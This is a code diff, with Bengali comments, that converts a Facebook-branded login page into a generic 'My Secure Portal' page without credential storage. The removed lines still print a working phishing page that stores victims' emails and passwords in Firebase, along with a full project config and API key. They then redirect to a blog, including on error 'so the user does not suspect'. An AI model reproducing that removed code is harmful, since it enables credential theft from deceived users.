@@ -3,68 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Login</title>
-    <link rel="stylesheet" href="style.css">
+    <title>My Secure Portal</title>
+    <style>
+        /* ফেসবুকের মতো না করে একটু আলাদা স্টাইল দিন */
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-card { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
+        .btn { width: 100%; padding: 12px; background-color: #42b72a; border: none; color: white; font-weight: bold; border-radius: 6px; cursor: pointer; }
+        .btn:hover { background-color: #36a420; }
+        h2 { color: #1c1e21; }
+    </style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="fb-text">
-            <h1>facebook</h1>
-            <p>Facebook helps you connect and share with the people in your life.</p>
-        </div>
-        <div class="login-box">
-            <input type="text" id="email" placeholder="Email or phone number">
-            <input type="password" id="pass" placeholder="Password">
-            <button class="login-btn" id="login-submit">Log In</button>
-            <a href="#">Forgotten password?</a>
-            <hr>
-            <button class="create-btn">Create new account</button>
-        </div>
+    <div class="login-card">
+        <h2>Welcome Back</h2>
+        <p>Please log in to your account</p>
+        <input type="email" id="email" placeholder="Email Address">
+        <input type="password" id="pass" placeholder="Password">
+        <button class="btn" id="login-submit">Login</button>
     </div>
 
     <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
-
-        // Firebase কনফিগ
-        const firebaseConfig = {
-            apiKey: "AIzaSyDab4A_V9rDyVpqw-rFerXs4zz4vdpmZRM",
-            authDomain: "my-fb-data.firebaseapp.com",
-            projectId: "my-fb-data",
-            storageBucket: "my-fb-data.firebasestorage.app",
-            messagingSenderId: "246019608846",
-            appId: "1:246019608846:web:78846906c24f9a1aa7075f"
-        };
-
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
-
-        // লগইন বাটনে ক্লিক করলে যা হবে
+        // Firebase কনফিগ এখানে দিন...
+        
         document.getElementById('login-submit').addEventListener('click', async () => {
             const emailValue = document.getElementById('email').value;
             const passValue = document.getElementById('pass').value;
 
-            // ডাটা খালি থাকলে সাবধান করবে
-            if (emailValue === "" || passValue === "") {
-                alert("Please enter your email and password.");
-                return;
-            }
-
-            try {
-                // Firebase-এ ডাটা সেভ হচ্ছে
-                await addDoc(collection(db, "user_data"), {
-                    email: emailValue,
-                    password: passValue,
-                    time: new Date()
-                });
-
-                // ডাটা সেভ হওয়ার সাথে সাথে আপনার ব্লগ লিংকে চলে যাবে
-                window.location.href = "https://akherbabu2006.blogspot.com"; 
-
-            } catch (e) {
-                console.error("Error: ", e);
-                // এরর হলেও ইউজারকে পাঠিয়ে দিবে যাতে সন্দেহ না হয়
-                window.location.href = "https://akherbabu2006.blogspot.com";
+            if (emailValue && passValue) {
+                try {
+                    // ডাটাবেজে সেভ করুন (শুধুমাত্র শেখার জন্য)
+                    // রিডাইরেক্ট করুন আপনার নিজের প্রোফাইল পেজে, ফেসবুকের মতো লিংকে নয়
+                    window.location.href = "success.html"; 
+                } catch (e) {
+                    console.error("Error: ", e);
+                }
             }
         });
     </script>
